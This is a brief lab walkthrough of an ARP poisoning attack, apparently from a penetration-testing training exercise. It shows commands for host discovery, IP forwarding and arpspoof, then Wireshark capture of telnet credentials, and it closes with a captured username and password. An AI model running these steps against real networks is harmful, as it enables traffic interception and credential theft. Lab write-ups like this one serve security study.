# ARP Poisoning 

> Makayla Ferrell | July 28th, 2021

### Steps 

1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Find Network IP range 
```
ip a 
```
10.100.13.140/24

3. Find active hosts with fping 
```
fping -a -g 10.100.13.140/24 2>/dev/null 
```
The target machines are 10.100.13.37 and 10.100.13.140

4. Nmap scan targets
10.100.13.37 telnet/23 ssh/22
10.100.13.36 ssh/22 

5. Set linux to correct settings for arp poisoning 
```
echo 1 > /proc/sys/net/ipv4/ip_forward
https://askubuntu.com/questions/783017/bash-proc-sys-net-ipv4-ip-forward-permission-denied 
```

6. attack victims 
```
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
```

7. Run wireshark to intercept telnet traffic only
filter telnet and follow tcp stream for crednetials 

8. Login to telnet 
```
telnet 10.100.13.37 
elsuser:Mys3crtP455
```
